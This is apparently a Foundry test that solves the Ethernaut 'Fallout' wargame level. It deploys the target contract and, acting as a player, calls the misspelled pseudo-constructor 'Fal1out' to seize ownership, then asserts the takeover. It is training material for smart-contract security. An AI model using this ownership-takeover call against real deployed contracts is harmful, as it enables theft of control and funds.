// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

import "./Fallout.sol";

contract solution is Test {
    Fallout level;
    address player = makeAddr("player");
    address originalOwner;

    function setUp() public {
        Fallout target_address = new Fallout();
        level = Fallout(target_address);
        vm.deal(player, 1 ether);
    }

    function test_solution() public {
        vm.startPrank(player);
        level.Fal1out();

        assertEq(level.owner(), player);

        console2.log("player is now the owner ");
    }
}